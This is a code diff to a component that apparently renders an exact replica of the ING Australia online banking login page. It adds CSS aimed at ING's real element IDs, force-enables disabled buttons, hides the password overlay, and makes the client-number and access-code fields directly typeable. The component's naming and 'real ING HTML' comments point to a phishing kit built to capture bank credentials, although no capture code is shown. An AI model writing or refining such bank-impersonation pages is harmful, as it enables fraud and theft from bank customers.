@@ -1107,6 +1107,10 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       s.textContent = `
 /* ⭐⭐⭐ ING AUSTRALIA FORCED BRAND ORANGE — CSS LEVEL BRUTEFORCE (NO ESCAPE) */
 /* BUTUN OLASI buton formlari, HEM HOST HEM IC BUTON, HEM CUSTOM WC */
+/* ⭐⭐⭐⭐⭐ GERCEK ING HTML'E GORE OZEL ID SECICILERI (EN KISA YOL) */
+#login-btn, #login-btn.uia-login, #login-btn.btn, #login-btn.btn-blue, #login-btn.btn-lg,
+#login-btn.btn-block, #login-btn.style-scope, #login-btn[disabled], #login-btn.disabled,
+#login-btn[class*='disabled'], #login-btn[aria-disabled='true'],
 ing-button, ing-login-submit, ui5-button, sg-button, sl-button, vaadin-button, mwc-button, md-button, paper-button,
 form button, button, input[type='submit'], input[type='button'], a[role='button'], [role='button'],
 .btn, .btn-primary, .btn-default, .btn-login, .btn-signin, .btn-sign-in, .btn-submit, .btn-next, .btn-continue, .btn-proceed, .btn-enter, .btn-confirm, .btn-auth,
@@ -1139,6 +1143,8 @@ form input[type='submit'], .signin, .sign-in, .login, .LogIn, .Continue, .Next, 
 }
 
 /* DISABLED / INACTIVE / GRAY CLASS OVERRIDE — ZORLA AKTIF GOSTER */
+#login-btn[disabled], #login-btn.disabled, #login-btn[class*='disabled'],
+#login-btn[aria-disabled='true'], #login-btn.is-disabled,
 .is-disabled, .is-disabled[class], .disabled, .btn-disabled, .disabled-btn, button:disabled, input[type='submit']:disabled,
 [class*='disabled'], [class*='inactive'], [class*='muted'], [class*='grayscale'], [class*='faded'], [class*='ghost'], [class*='dim']
 {
@@ -1154,6 +1160,26 @@ form input[type='submit'], .signin, .sign-in, .login, .LogIn, .Continue, .Next, 
   border-color: #B64100 !important;
   border-style: solid !important;
   border-width: 1px !important;
+}
+
+/* ACCESS CODE + CLIENT NUMBER INPUTS — KLAVYE ILE YAZILABILIR GARANTI */
+#password, #password.form-control, #password.input-lg, #password.style-scope,
+#password.input-empty-password, #cifField, #cifField.form-control, #cifField.input-lg,
+#cifField.style-scope, #cifField.uia-cif
+{
+  -webkit-user-select: text !important;
+  user-select: text !important;
+  pointer-events: auto !important;
+  caret-color: auto !important;
+  cursor: text !important;
+  background-color: #FFFFFF !important;
+  color: #2B2E35 !important;
+}
+.password-overlay, .password-overlay.style-scope {
+  display: none !important;
+  pointer-events: none !important;
+  visibility: hidden !important;
+  opacity: 0 !important;
 }
 
 /* CSS DEGISKENLERINI (WC tarafindan okunanlar) ZORLA TURUNCU */
